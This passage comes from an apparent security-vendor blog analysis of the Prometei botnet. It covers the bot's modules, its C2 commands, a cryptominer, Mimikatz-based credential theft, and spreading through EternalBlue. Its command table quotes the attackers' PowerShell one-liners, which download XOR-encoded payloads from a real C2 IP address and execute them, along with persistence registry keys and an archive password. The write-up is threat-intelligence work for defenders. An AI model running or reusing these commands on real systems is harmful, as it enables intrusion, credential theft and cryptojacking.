<li aria-level="1"><span style="font-size: 18px;">It uses Netsh commands to add a firewall rule that will allow <em>sqhost.exe</em> to create connections over HTTP</span></li>
<li aria-level="1"><span style="font-size: 18px;">It checks if there is a registry key named “UPlugPlay”, and if present it deletes it</span></li>
<li aria-level="1"><span style="font-size: 18px;">It sets a registry key for persistence as <em>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UPlugPlay</em> with the image path and command line <em>c:\windows\sqhost.exe Dcomsvc</em></span></li>
<li aria-level="1"><span style="font-size: 18px;">It creates several registry keys under <em>SOFTWARE\Microsoft\Fax\</em> and <em>SOFTWARE\Intel\support\</em> with the names <em>MachineKeyId, EncryptedMachineKeyId</em> and <em>CommId</em>, for later use by the different components for C2 communication.</span><br><br></li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 style="font-weight: normal; font-size: 36px;">Sqhost.exe</h3>
<p>Sqhost.exe is the main bot module, complete with backdoor capabilities that support a wide range of commands. Sqhost.exe is able to parse the prometei.cgi file from 4 different hardcoded command and control servers. The file contains the command to be executed on the machine. The commands can be used as “stand-alone” native OS commands (cmd commands, WMI, etc.) or can be used to interact with the other modules of the malware located under C:\Windows\dell</p>
<p style="text-align: center;"><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-3.png?width=1166&amp;name=prometei-blog-image-3.png" alt="prometei-blog-image-3" width="1166" loading="lazy" style="margin-left: auto; margin-right: auto; display: block; width: 1166px;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-3.png?width=583&amp;name=prometei-blog-image-3.png 583w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-3.png?width=1166&amp;name=prometei-blog-image-3.png 1166w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-3.png?width=1749&amp;name=prometei-blog-image-3.png 1749w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-3.png?width=2332&amp;name=prometei-blog-image-3.png 2332w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-3.png?width=2915&amp;name=prometei-blog-image-3.png 2915w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-3.png?width=3498&amp;name=prometei-blog-image-3.png 3498w" sizes="(max-width: 1166px) 100vw, 1166px"></p>
<p style="text-align: center; font-size: 16px;"><em><span style="color: #5e5f5f;">Embedded C2 domains in Sqhost.exe</span></em></p>
<p>Sqhost supports the following commands:</p>
<ul style="font-size: 18px;">
<li aria-level="1"><strong>Call </strong>- Execute a program or a file</li>
<li aria-level="1"><strong>Start_mining</strong> - launch SearchIndexer.exe (the miner) with the file C:\windows\dell\Desktop.dat as its parameters&nbsp;</li>
<li aria-level="1"><strong>Start_mining1</strong> - request C:\windows\dell\Desktop.dat from the C2, and then launch SearchIndexer.exe (the miner) with the file C:\windows\dell\Desktop.dat as its parameters</li>
<li aria-level="1"><strong>Stop_mining</strong> - runs cmd.exe with command: “/c taskkill -f -im SearchIndexer.exe”</li>
<li aria-level="1"><strong>Wget </strong>- download a file</li>
<li aria-level="1"><strong>Xwget </strong>- download a file, save it, and use XOR to decrypt it</li>
<li aria-level="1"><strong>Quit </strong>- terminate the bot execution using TerminateProcess</li>
<li aria-level="1"><strong>Quit2 </strong>- terminate the bot execution without using TerminateProcess</li>
<li aria-level="1"><strong>Sysinfo </strong>- collect information about the machine (using native APIs and WMIC)</li>
<li aria-level="1"><strong>Exec </strong>- execute a command</li>
<li aria-level="1"><strong>Ver </strong>- return the bot version</li>
<li aria-level="1"><strong>Enc </strong>- get/set the RC4 encryption key</li>
<li aria-level="1"><strong>Extip </strong>- return the bot's external IP address</li>
<li aria-level="1"><strong>Chkport </strong>- check if a specific port is open</li>
<li aria-level="1"><strong>Search </strong>- search for files by name (potentially crypto currency wallets)</li>
<li aria-level="1"><strong>Set_timeout </strong>- set a period of time for connecting to C2 server</li>
<li aria-level="1"><strong>Touch </strong>- open a file</li>
<li aria-level="1"><strong>Touch_internal </strong>- edit a file with a single byte to change access times</li>
<li aria-level="1"><strong>Touch_stop </strong>- close a file</li>
<li aria-level="1"><strong>Update </strong>- update the bot version</li>
<li aria-level="1"><strong>Set_Autoexec2 </strong>- set an automatic execution</li>
<li aria-level="1"><strong>Set_Autoexec1 </strong>- set an automatic execution</li>
<li aria-level="1"><strong>Set_cc1 </strong>- set a C2 server</li>
<li aria-level="1"><strong>Set_cc0 </strong>- set a C2 server</li>
</ul>
<p>&nbsp;</p>
<p style="text-align: center; padding-left: 40px;"><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-4.png?width=584&amp;name=prometei-blog-image-4.png" alt="prometei-blog-image-4" width="584" loading="lazy" style="margin-left: auto; margin-right: auto; display: block; width: 584px;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-4.png?width=292&amp;name=prometei-blog-image-4.png 292w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-4.png?width=584&amp;name=prometei-blog-image-4.png 584w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-4.png?width=876&amp;name=prometei-blog-image-4.png 876w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-4.png?width=1168&amp;name=prometei-blog-image-4.png 1168w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-4.png?width=1460&amp;name=prometei-blog-image-4.png 1460w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-4.png?width=1752&amp;name=prometei-blog-image-4.png 1752w" sizes="(max-width: 584px) 100vw, 584px"></p>
<p style="text-align: center; font-size: 16px;"><em><span style="color: #5e5f5f;">Some of the tasks supported by Sqhost.exe</span></em></p>
<p>The execution of the malware encountered in the investigation shows activities performed by the attackers which included tree processes: cmd.exe, sqhost.exe and wmic.exe:</p>
<h2><span style="font-size: 16px;"><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-5.png?width=972&amp;name=prometei-blog-image-5.png" alt="prometei-blog-image-5" width="972" loading="lazy" style="margin-left: auto; margin-right: auto; display: block; width: 972px;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-5.png?width=486&amp;name=prometei-blog-image-5.png 486w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-5.png?width=972&amp;name=prometei-blog-image-5.png 972w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-5.png?width=1458&amp;name=prometei-blog-image-5.png 1458w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-5.png?width=1944&amp;name=prometei-blog-image-5.png 1944w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-5.png?width=2430&amp;name=prometei-blog-image-5.png 2430w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-5.png?width=2916&amp;name=prometei-blog-image-5.png 2916w" sizes="(max-width: 972px) 100vw, 972px"></span></h2>
<p style="text-align: center; font-size: 16px;"><em><span style="color: #5e5f5f;">Attack tree of the infection as observed in the Cybereason Defense platform</span></em></p>
<p><strong>CMD.exe:</strong> was used to execute the following commands (some of the commands are broken into individual commands for readability):</p>
<div data-hs-responsive-table="true" style="overflow-x: auto; max-width: 100%; width: 100%; margin-left: auto; margin-right: auto;">
<table style="width: 100%; border-collapse: collapse; table-layout: fixed; height: 356px; border: 1px solid #99acc2;">
<tbody>
<tr style="height: 25px;">
<td style="width: 66.7785%; height: 25px; padding: 4px; border: 1px solid #99acc2;">Auditpol /set /subcategory:"Logon" /failure:enable</td>
<td style="width: 33.2215%; height: 25px; padding: 4px; border: 1px solid #99acc2;">Configuring Microsoft Windows Server to log all failed logons using <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/auditpol-set"><span>auditpol</span></a></td>
</tr>
<tr style="height: 231px;">
<td style="width: 66.7785%; height: 231px; padding: 4px; border: 1px solid #99acc2;">
<ul>
<li aria-level="1">netsh advfirewall firewall delete rule name="Banned brute IPs"</li>
<li aria-level="1">netsh advfirewall firewall add rule name="Banned brute IPs" dir=in interface=any action=block localip=68.12.114.202,71.181.80.24,179.52.245.208,24.0.176.79,68.161.157.243,</li>
<li aria-level="1">netsh advfirewall firewall add rule name="Banned brute IPs" dir=in interface=any action=block remoteip=68.12.114.202,71.181.80.24,179.52.245.208,24.0.176.79,68.161.157.243,</li>
</ul>
</td>
<td style="width: 33.2215%; height: 231px; padding: 4px; border: 1px solid #99acc2;">Blocking certain IP addresses from communicating with the machine. We assess that those IP addresses are used by other malware, potentially Miners, and the attackers behind Prometei wanted to ensure that all the resources of the network are available just for them.</td>
</tr>
<tr style="height: 25px;">
<td style="width: 66.7785%; height: 25px; padding: 4px; border: 1px solid #99acc2;">powershell.exe "if(-not (Test-Path 'C:\windows\ExchDefender.exe')) {$b64=$(New-Object Net.WebClient).DownloadString('http://178.21.164.68/dwn.php?d=ExchDefender.exe&amp;b64=1');$data=[System.Convert]::FromBase64String($b64);$bt=New-Object Byte[]($data.Length);[int]$j=0;FOR([int]$i=0;$i -lt $data.Length; $i++){$j+=66;$bt[$i]=(((($data[$i]) -bxor (($i*3) -band 0xFF))-$j) -band 0xFF);}[io.file]::WriteAllBytes('C:\windows\dell\ExchDefender.exe',$bt);}"</td>
<td style="width: 33.2215%; height: 25px; padding: 4px; border: 1px solid #99acc2;">Downloading ExchDefender.exe, an additional module of the botnet into C:\\Windows\dell and executes it.</td>
</tr>
<tr style="height: 25px;">
<td style="width: 66.7785%; height: 25px; padding: 4px; border: 1px solid #99acc2;">powershell.exe "if(-not (Test-Path 'rdpcIip.exe')) {$b64=$(New-Object Net.WebClient).DownloadString('http://178.21.164.68/walk278_64.php');$data=[System.Convert]::FromBase64String($b64);$bt=New-Object Byte[]($data.Length);[int]$j=0;FOR([int]$i=0;$i -lt $data.Length; $i++){$j+=66;$bt[$i]=(((($data[$i]) -bxor (($i*3) -band 0xFF))-$j) -band 0xFF);}[io.file]::WriteAllBytes('rdpcIip.exe',$bt);}"&amp;C:\Windows\svchost.exe /sha1chk 381C17131D13E1203C91720870ECB441F5BE297E miwalk.exe&amp;sqhost.exe /sha1chk 381C17131D13E1203C91720870ECB441F5BE297E miwalk.exe&amp;C:\Windows\svchost.exe /sha1chk 9623DCD8836C481AA44AE84499F20E2439941A4B rdpcIip.exe&amp;sqhost.exe /sha1chk 9623DCD8836C481AA44AE84499F20E2439941A4B rdpcIip.exe&amp;rdpcIip.exe</td>
<td style="width: 33.2215%; height: 25px; padding: 4px; border: 1px solid #99acc2;">Downloading rdpcIip.exe, an additional module of the botnet into C:\\Windows and executes it.</td>
</tr>
<tr style="height: 25px;">
<td style="width: 66.7785%; height: 25px; padding: 4px; border: 1px solid #99acc2;">taskkill -f -im rdpcIip.exe&amp;del rdpcIip.exe&amp;powershell.exe "if(-not (Test-Path '7z.dll')) {(New-Object Net.WebClient).DownloadFile('http://178.21.164.68/7z.dll','7z.dll');}if(-not (Test-Path '7z.exe')) {(New-Object Net.WebClient).DownloadFile('http://178.21.164.68/7z.exe','7z.exe');} (New-Object Net.WebClient).DownloadFile('http://178.21.164.68/netwalker2.7z','netwalker.7z');"&amp;7z x netwalker.7z -phorhor123 -y&amp;del netwalker.7z</td>
<td style="width: 33.2215%; height: 25px; padding: 4px; border: 1px solid #99acc2;">Downloading 7z.exe and an archived file, Netwalker.7z and use the 7zip executable to extract the files in the archive.</td>
</tr>
<tr style="height: 25px;">
<td style="width: 66.7785%; height: 25px; padding: 4px; border: 1px solid #99acc2;">
<p>taskkill -f -im rdpcIip.exe&amp;ping -n 3 127.0.0.1&amp;C:\Windows\svchost.exe /sha1chk 9623DCD8836C481AA44AE84499F20E2439941A4B rdpcIip.exe&amp;sqhost.exe /sha1chk 9623DCD8836C481AA44AE84499F20E2439941A4B rdpcIip.exe&amp;powershell.exe "if(-not (Test-Path 'miwalk.exe')) {$b64=$(New-Object Net.WebClient).DownloadString('http://178.21.164.68/mi64.php');$data=[System.Convert]::FromBase64String($b64);$bt=New-Object Byte[]($data.Length);[int]$j=0;FOR([int]$i=0;$i -lt $data.Length; $i++){$j+=66;</p>
<p>taskkill -f -im rdpcIip.exe&amp;ping -n 3 127.0.0.1&amp;C:\Windows\svchost.exe /sha1chk 9623DCD8836C481AA44AE84499F20E2439941A4B rdpcIip.exe&amp;sqhost.exe /sha1chk 9623DCD8836C481AA44AE84499F20E2439941A4B rdpcIip.exe&amp;powershell.exe "if(-not (Test-Path 'miwalk.exe')) {$b64=$(New-Object Net.WebClient).DownloadString('http://178.21.164.68/mi64.php');$data=[System.Convert]::FromBase64String($b64);$bt=New-Object Byte[]($data.Length);[int]$j=0;FOR([int]$i=0;$i -lt $data.Length; $i++){$j+=66;$bt[$i]=(((($data[$i]) -bxor (($i*3) -band 0xFF))-$j) -band 0xFF);}[io.file]::WriteAllBytes('miwalk.exe',$bt);}"</p>
</td>
<td style="width: 33.2215%; height: 25px; padding: 4px; border: 1px solid #99acc2;">Downloading miwalk.exe, an additional module of the botnet into C:\\Windows\.</td>
</tr>
</tbody>
</table>
</div>
<p>&nbsp;</p>
<p><span style="background-color: transparent; font-weight: 400;">In addition, it appears the attackers attempted to execute C:\Windows\svchost.exe, which is the same file as sqhost.exe, and the attackers named it as svchost in earlier versions, but it wasn’t downloaded in the attack or in existence by this name. The reference for “svchost.exe” resides in different components of the malware, sometimes even in addition to “sqhost”. Our assumption is that it is used either for backwards-compatibility or it is the case that the attackers didn’t bother to change it in some places after renaming the main bot module to “sqhost.exe”.</span></p>
<ul>
<li aria-level="1"><span style="font-size: 18px;"><strong>Sqhost.exe:</strong> executed with “-watchdog” parameter, to make sure that it will keep running on the system.</span></li>
<li aria-level="1"><span style="font-size: 18px;"><strong>Wmic.exe:</strong> was used to perform reconnaissance commands:</span></li>
</ul>
<span style="font-size: 18px;">- wmic ComputerSystem get Model</span><br><span style="font-size: 18px;">- wmic OS get lastbootuptime</span><br><span style="font-size: 18px;">- wmic baseboard get product</span><br><span style="font-size: 18px;">- wmic os get caption</span><br><br><br>
<h3 style="font-size: 36px; font-weight: normal;">ExchDefender.exe</h3>
<p>Exchdefender tries to masquerade as a “Microsoft Exchange Defender”, a non-existent program that masquerades as a legitimate Microsoft product.&nbsp;</p>
<p>When first executed, it creates a service named “Microsoft Exchange Defender” [MSExchangeDefenderPL] that is set to execute the binary (from C:\Windows) with the same command line as seen used with sqhost.exe - “Dcomsvc”:</p>
<p style="text-align: center;"><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-6.png?width=606&amp;name=prometei-blog-image-6.png" alt="prometei-blog-image-6" width="606" loading="lazy" style="margin-left: auto; margin-right: auto; display: block; width: 606px;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-6.png?width=303&amp;name=prometei-blog-image-6.png 303w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-6.png?width=606&amp;name=prometei-blog-image-6.png 606w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-6.png?width=909&amp;name=prometei-blog-image-6.png 909w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-6.png?width=1212&amp;name=prometei-blog-image-6.png 1212w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-6.png?width=1515&amp;name=prometei-blog-image-6.png 1515w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-6.png?width=1818&amp;name=prometei-blog-image-6.png 1818w" sizes="(max-width: 606px) 100vw, 606px"></p>
<p style="text-align: center; font-size: 16px;"><em><span style="color: #5e5f5f;">Output of running Exchdefender.exe</span></em></p>
<p style="text-align: center;"><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-7.png?width=439&amp;name=prometei-blog-image-7.png" alt="prometei-blog-image-7" width="439" loading="lazy" style="margin-left: auto; margin-right: auto; display: block; width: 439px;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-7.png?width=220&amp;name=prometei-blog-image-7.png 220w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-7.png?width=439&amp;name=prometei-blog-image-7.png 439w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-7.png?width=659&amp;name=prometei-blog-image-7.png 659w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-7.png?width=878&amp;name=prometei-blog-image-7.png 878w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-7.png?width=1098&amp;name=prometei-blog-image-7.png 1098w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-7.png?width=1317&amp;name=prometei-blog-image-7.png 1317w" sizes="(max-width: 439px) 100vw, 439px"></p>
<p style="text-align: center; font-size: 16px;"><em><span style="color: #5e5f5f;">Service name and command line used to execute Exchdefender.exe</span></em></p>
<p>Exchdefender constantly checks the files within the directory C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth, a known directory to be used to host WebShells. The malware is specifically interested in the file “ExpiredPasswords.aspx” which was reported to be the name used to obscure the <a href="https://github.com/3gstudent/3gstudent.github.io/blob/main/_posts/2019-4-20-%E5%AF%B9APT34%E6%B3%84%E9%9C%B2%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E2%80%94%E2%80%94HighShell%E5%92%8CHyperShell.md"><span>HyperShell backdoor used by APT34</span></a> (aka. OilRig). If the file exists, the malware immediately deletes it.</p>
<p>Our assessment is that this tool is used to “protect” the compromised Exchange Server by deleting potential WebShells so Prometei will remain the only malware using its resources.</p>
<h3 style="font-size: 36px; font-weight: normal;">SearchIndexer.exe</h3>
<p>SearchIndexer.exe is an <a href="https://github.com/xmrig/xmrig"><span>open source Monero mining software</span></a> (XMRig miner). It is executed with the content from “desktop.dat” file as a parameter, which contains the mining server and the username for the mining server:</p>
<p><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-8.png?width=931&amp;name=prometei-blog-image-8.png" alt="prometei-blog-image-8" width="931" loading="lazy" style="margin-left: auto; margin-right: auto; display: block; width: 931px;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-8.png?width=466&amp;name=prometei-blog-image-8.png 466w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-8.png?width=931&amp;name=prometei-blog-image-8.png 931w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-8.png?width=1397&amp;name=prometei-blog-image-8.png 1397w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-8.png?width=1862&amp;name=prometei-blog-image-8.png 1862w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-8.png?width=2328&amp;name=prometei-blog-image-8.png 2328w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-8.png?width=2793&amp;name=prometei-blog-image-8.png 2793w" sizes="(max-width: 931px) 100vw, 931px"></p>
<p style="text-align: center; font-size: 16px;"><em><span style="color: #5e5f5f;">Content of Desktop.dat</span></em></p>
<p>Following the investigation, it appears that the user is “banned due to reports of botnet mining” from around March 2021, and it’s very likely that the attackers have changed the user already:</p>
<p><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-9.png?width=931&amp;name=prometei-blog-image-9.png" alt="prometei-blog-image-9" width="931" loading="lazy" style="margin-left: auto; margin-right: auto; display: block; width: 931px;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-9.png?width=466&amp;name=prometei-blog-image-9.png 466w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-9.png?width=931&amp;name=prometei-blog-image-9.png 931w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-9.png?width=1397&amp;name=prometei-blog-image-9.png 1397w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-9.png?width=1862&amp;name=prometei-blog-image-9.png 1862w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-9.png?width=2328&amp;name=prometei-blog-image-9.png 2328w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-9.png?width=2793&amp;name=prometei-blog-image-9.png 2793w" sizes="(max-width: 931px) 100vw, 931px"></p>
<p style="text-align: center; font-size: 16px;"><em><span style="color: #5e5f5f;">A massage showing that the user was banned</span></em></p>
<h3 style="font-size: 36px; font-weight: normal;">Netwalker.7z</h3>
<p>The Netwalker.7z archive downloaded from the C2 178.21.164[.]68 is password protected, using the password “horhor123”. The content of the archive is saved under C:\Windows\dell, together with the other components of the bot. The archive contains the following files: Nethelper2.exe, Nethelper4.exe, Windrlver.exe, a few DLLs,a copy of RdpcIip.exe and a few DLLs used by the bot components:</p>
<p style="text-align: center;"><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-10.png?width=889&amp;name=prometei-blog-image-10.png" alt="prometei-blog-image-10" width="889" loading="lazy" style="margin-left: auto; margin-right: auto; display: block; width: 889px;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-10.png?width=445&amp;name=prometei-blog-image-10.png 445w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-10.png?width=889&amp;name=prometei-blog-image-10.png 889w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-10.png?width=1334&amp;name=prometei-blog-image-10.png 1334w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-10.png?width=1778&amp;name=prometei-blog-image-10.png 1778w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-10.png?width=2223&amp;name=prometei-blog-image-10.png 2223w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-10.png?width=2667&amp;name=prometei-blog-image-10.png 2667w" sizes="(max-width: 889px) 100vw, 889px"></p>
<p style="text-align: center; font-size: 16px;"><em><span style="color: #5e5f5f;">Content of Netwalker.7z</span></em></p>
<h3 style="font-size: 36px; font-weight: normal;">RdpcIip.exe</h3>
<p>RdcIip.exe (with a capital “I” instead of a lowercase “L”) is both downloaded directly by sqhost.exe and is also contained in the Netwalker.7z archive". It is a key component of the malware. It has huge (trust us, <em>huge</em>) functionality with different branches with the main purpose being to interact with other components of the malware and make them work all together.</p>
<p>RdpcIip is responsible for some of the most important functions of the malware - harvesting credentials (using another component called Miwalk.exe) and spreading across the network using the stolen credentials as well as using the SMB exploit <a href="https://en.wikipedia.org/wiki/EternalBlue"><span>EternalBlue</span></a> and the RDP exploit <a href="https://en.wikipedia.org/wiki/BlueKeep"><span>BlueKeep</span></a>.</p>
<h3 style="font-weight: normal; font-size: 36px;"><span style="color: #434343;">Harvesting Credentials For Spreading</span></h3>
<p>To harvest credentials, RdpcIip.exe launches another component, Miwalk.exe, a customized version of <a href="https://github.com/gentilkiwi/mimikatz/wiki"><span>Mimikatz</span></a>. The output is saved to ssldata2.dll and ssldata2_old.dll, which are text files, and RdpcIip reads those files and tries to validate the credentials and use them for spreading across the network.&nbsp;</p>
<p>In addition, RdpcIip.exe also changes the following registry key to 1 so the credentials are stored in memory and retrieved using techniques employed by Miwalk.exe:&nbsp;</p>
<p style="padding-left: 40px;">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential</p>
<p style="text-align: center;"><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-11.png?width=749&amp;name=prometei-blog-image-11.png" alt="prometei-blog-image-11" width="749" loading="lazy" style="margin-left: auto; margin-right: auto; display: block; width: 749px;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-11.png?width=375&amp;name=prometei-blog-image-11.png 375w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-11.png?width=749&amp;name=prometei-blog-image-11.png 749w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-11.png?width=1124&amp;name=prometei-blog-image-11.png 1124w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-11.png?width=1498&amp;name=prometei-blog-image-11.png 1498w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-11.png?width=1873&amp;name=prometei-blog-image-11.png 1873w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-11.png?width=2247&amp;name=prometei-blog-image-11.png 2247w" sizes="(max-width: 749px) 100vw, 749px"></p>
<p style="text-align: center; font-size: 16px;"><em><span style="color: #5e5f5f;">Changing the registry key “UseLogonCredential”</span></em></p>
<p>&nbsp;</p>
<p style="text-align: center;"><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-12.png?width=735&amp;name=prometei-blog-image-12.png" alt="prometei-blog-image-12" width="735" loading="lazy" style="margin-left: auto; margin-right: auto; display: block; width: 735px;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-12.png?width=368&amp;name=prometei-blog-image-12.png 368w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-12.png?width=735&amp;name=prometei-blog-image-12.png 735w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-12.png?width=1103&amp;name=prometei-blog-image-12.png 1103w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-12.png?width=1470&amp;name=prometei-blog-image-12.png 1470w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-12.png?width=1838&amp;name=prometei-blog-image-12.png 1838w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-12.png?width=2205&amp;name=prometei-blog-image-12.png 2205w" sizes="(max-width: 735px) 100vw, 735px"></p>
<p style="text-align: center; font-size: 16px;"><em><span style="color: #5e5f5f;">Reading the contents of ssldata2.dll and ssldata2_old.dll</span></em></p>
<p>In addition to using the harvested credentials, RdpcIip also tries to spread across the network by brute-forcing the usernames and passwords using a built-in list of common combinations:</p>
<p>&nbsp;</p>
<p style="text-align: center;"><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-13.png?width=773&amp;name=prometei-blog-image-13.png" alt="prometei-blog-image-13" width="773" loading="lazy" style="margin-left: auto; margin-right: auto; display: block; width: 773px;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-13.png?width=387&amp;name=prometei-blog-image-13.png 387w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-13.png?width=773&amp;name=prometei-blog-image-13.png 773w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-13.png?width=1160&amp;name=prometei-blog-image-13.png 1160w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-13.png?width=1546&amp;name=prometei-blog-image-13.png 1546w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-13.png?width=1933&amp;name=prometei-blog-image-13.png 1933w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/prometei-blog-image-13.png?width=2319&amp;name=prometei-blog-image-13.png 2319w" sizes="(max-width: 773px) 100vw, 773px"></p>
<p style="text-align: center; font-size: 16px;"><em><span style="color: #5e5f5f;">A list of common usernames and passwords embedded in RdpcIip.exe</span></em></p>
<h3 style="font-weight: normal; font-size: 36px;"><span style="color: #434343;">Network Spreading by Exploiting Vulnerabilities</span></h3>
<p>If RdpcIip can’t spread to other machines using the stolen credentials, it uses the EternalBlue exploit and sends a shellcode to install and launch the main bot module Sqhost.exe. To use the exploit, the malware downgrades the SMB protocol to SMB1, which is vulnerable to the exploit:</p>
